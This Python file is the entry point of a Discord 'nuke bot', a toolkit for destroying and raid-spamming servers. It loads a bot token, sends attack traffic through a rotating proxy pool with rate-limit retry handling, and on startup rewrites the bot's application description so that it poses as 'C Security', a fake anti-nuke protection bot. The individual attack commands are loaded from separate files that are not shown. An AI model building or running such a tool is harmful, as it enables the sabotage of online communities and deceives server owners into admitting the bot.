"""Nuke bot - the "! command" nuke toolkit.

Prefix commands only: every command operates on the server it is typed
in. Setup:

    .env          - DISCORD_TOKEN=your bot token
    proxies.txt   - your own proxy list (ip:port:user:pass per line);
                    attacks rotate through the pool, everything else
                    goes direct. No file = direct only.
    raid_message.txt - the text spam channels / the nuke drops

Every command lives in its own file under cogs/.
"""

import asyncio
import os

import aiohttp
import discord
from discord.ext import commands

from core.patch429 import install_429_retry
from core.proxies import ProxyPool, load_proxies, set_pool
from cogs.common import blacklist_check

HERE = os.path.dirname(os.path.abspath(__file__))


def _load_env(path=None):
    """Tiny .env reader - no dependency, does not override the real env."""
    path = path or os.path.join(HERE, ".env")
    try:
        with open(path, encoding="utf-8") as fh:
            for line in fh:
                line = line.strip()
                if not line or line.startswith("#") or "=" not in line:
                    continue
                key, value = line.split("=", 1)
                os.environ.setdefault(key.strip(), value.strip())
    except OSError:
        pass


_load_env()

TOKEN = os.environ.get("DISCORD_TOKEN")
if not TOKEN:
    raise SystemExit("no DISCORD_TOKEN - put it in .env (DISCORD_TOKEN=...)")

API = "https://discord.com/api/v10"

intents = discord.Intents.default()
intents.message_content = True
intents.typing = False
bot = commands.Bot(command_prefix="!", intents=intents)
bot.add_check(blacklist_check)


def setup_proxies():
    """Load proxies.txt into the attack pool - gateway stays DIRECT.

    Proxies are for attack rotation only; the gateway + bot REST ride
    the host IP so the bot never drops when the pool blinks.
    """
    proxies_path = os.path.join(HERE, "proxies.txt")
    if not os.path.exists(proxies_path):
        print("[i] no proxies.txt - running direct")
        return None
    entries = load_proxies(proxies_path)
    if not entries:
        print(f"[!] {proxies_path} exists but has no usable proxies")
        return None
    pool = ProxyPool(entries)
    set_pool(pool)
    install_429_retry()
    print(f"[+] attack pool: {len(pool)} proxies (gateway DIRECT)")
    return pool


@bot.event
async def on_ready():
    print(f"[nuke] logged in as {bot.user} ({bot.user.id})")
    print(f"[nuke] guilds: {len(bot.guilds)}")
    # camouflage - present as a server security bot
    await bot.change_presence(activity=discord.Activity(
        type=discord.ActivityType.watching, name="for raids & nukes"))
    try:
        async with aiohttp.ClientSession() as s:
            async with s.patch(
                f"{API}/applications/@me",
                headers={"Authorization": f"Bot {TOKEN}",
                         "Content-Type": "application/json",
                         "User-Agent": "DiscordBot (https://csecurity.example, 1.0.0)"},
                json={"description": "C Security - advanced server protection "
                                     "| anti-nuke - anti-raid - audit logging "
                                     "| keep your community safe"},
            ) as r:
                print(f"[nuke] camouflage description: HTTP {r.status}")
    except Exception as exc:
        print(f"[nuke] description patch failed: {exc}")


async def load_cogs():
    """Every command is its own file - load them all."""
    cogs_dir = os.path.join(HERE, "cogs")
    loaded = 0
    for fname in sorted(os.listdir(cogs_dir)):
        if not fname.endswith(".py") or fname.startswith("_"):
            continue
        name = fname[:-3]
        if name == "common":  # shared plumbing, not a cog
            continue
        await bot.load_extension(f"cogs.{name}")
        loaded += 1
    print(f"[nuke] loaded {loaded} command cogs")


async def main():
    if setup_proxies():
        print("[+] 429 handling bundled into proxy rotation")
    else:
        install_429_retry()
    async with bot:
        await load_cogs()
        await bot.start(TOKEN)


if __name__ == "__main__":
    asyncio.run(main())
